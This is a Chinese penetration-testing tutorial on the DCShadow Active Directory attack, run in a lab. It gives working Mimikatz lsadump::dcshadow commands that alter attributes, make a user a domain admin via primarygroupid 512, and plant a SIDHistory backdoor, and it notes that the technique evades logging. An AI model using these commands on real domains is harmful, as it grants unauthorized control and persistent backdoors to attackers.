> 原文链接: https://www.anquanke.com//post/id/146551 


# 域渗透：DCShadow攻击与利用


                                阅读量   
                                **163607**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p1.ssl.qhimg.com/t01c26353fe96d9f99f.jpg)](https://p1.ssl.qhimg.com/t01c26353fe96d9f99f.jpg)



## 一、原理

我们知道可以利用Mimikatz远程从DC中复制数据，即Dcsync; 类似的dcshadow可以伪装成DC，让正常DC通过伪造的DC中复制数据。<br>[![](https://p4.ssl.qhimg.com/t01111bdfdba598acc8.png)](https://p4.ssl.qhimg.com/t01111bdfdba598acc8.png)<br>
步骤<br>
1、通过dcshadow更改配置架构和注册SPN值，将我们的服务器注册为Active Directory中的DC<br>
2、在我们伪造的DC上更改数据，并利用域复制将数据同步到正常DC上。<br>
相关API:DSBind、DSR*等<br>[https://msdn.microsoft.com/en-us/library/ms675931(v=vs.85).aspx](https://msdn.microsoft.com/en-us/library/ms675931(v=vs.85).aspx)

从原理中我们可以认识到两点：<br>
1、需要具备域管权限或域控本地管理权限，注册spn值，写权限等<br>
2、除了dc之间的连接通信，默认情况下不会记录事件日志



## 二、利用条件

测试环境：dc机器2008r2 x64、伪装机器：win7 x64<br>
准备条件：（两个窗口）<br>
1、win7 system权限 (1号窗口)，可以利用psexec -s cmd调system会话，也可以用mimikatz运行驱动模式，确保所有线程都运行在system上<br>[![](https://p3.ssl.qhimg.com/t013ce15ea573a44b90.png)](https://p3.ssl.qhimg.com/t013ce15ea573a44b90.png)

2、win7 域管权限 （2号窗口）<br>
在win7 中利用psexec 调用cmd即可：<br>[![](https://p4.ssl.qhimg.com/t01540180d6410ab57c.png)](https://p4.ssl.qhimg.com/t01540180d6410ab57c.png)

## 

## 三、利用方式

1、更改属性描述值<br>
1号窗口执行数据更改与监听（后同）：<br>`lsadump::dcshadow /object:CN=dc,CN=Users,DC=seven,DC=com /attribute:description /value:”anquanke-test2018!!”`<br>[![](https://p3.ssl.qhimg.com/t019f507363191dd4ee.png)](https://p3.ssl.qhimg.com/t019f507363191dd4ee.png)<br>
2号窗口执行域复制（后同）：<br>`lsadump::dcshadow /push`<br>[![](https://p2.ssl.qhimg.com/t014299c1ee32e871f8.png)](https://p2.ssl.qhimg.com/t014299c1ee32e871f8.png)<br>
在dc2008上查看结果：<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01a93b3f63b603f3c8.png)

2、添加域管<br>`lsadump::dcshadow /object:CN=dc,CN=Users,DC=seven,DC=com /attribute:primarygroupid/value:512`<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0138092af81399a4ad.png)<br>
执行域复制后成功添加域管：<br>[![](https://p2.ssl.qhimg.com/t01e08c9ec44027d4f2.png)](https://p2.ssl.qhimg.com/t01e08c9ec44027d4f2.png)

3、添加sidhistory 后门<br>
查看域管administrator sid：<br>[![](https://p3.ssl.qhimg.com/t0190d7a944080a34ef.png)](https://p3.ssl.qhimg.com/t0190d7a944080a34ef.png)<br>`lsadump::dcshadow /object:CN=dc,CN=Users,DC=seven,DC=com /attribute:sidhistory /value:S-1-5-21-1900941692-2128706383-2830697502-500`<br>[![](https://p5.ssl.qhimg.com/t016f17f77d69422619.png)](https://p5.ssl.qhimg.com/t016f17f77d69422619.png)<br>
使用dc用户建立net use 链接后可成功访问域控：<br>[![](https://p0.ssl.qhimg.com/t012267bff7ebfca00b.png)](https://p0.ssl.qhimg.com/t012267bff7ebfca00b.png)

## 

## 四、总结

Dcshadow 的利用我们可以做很多事情，包括ldap用户的修改，添加后门（sidhistory后门， AdminSDHolder后门，acl后门等等），在碰到域防护较为严格的时候，往往能起到很好的bypass的效果。
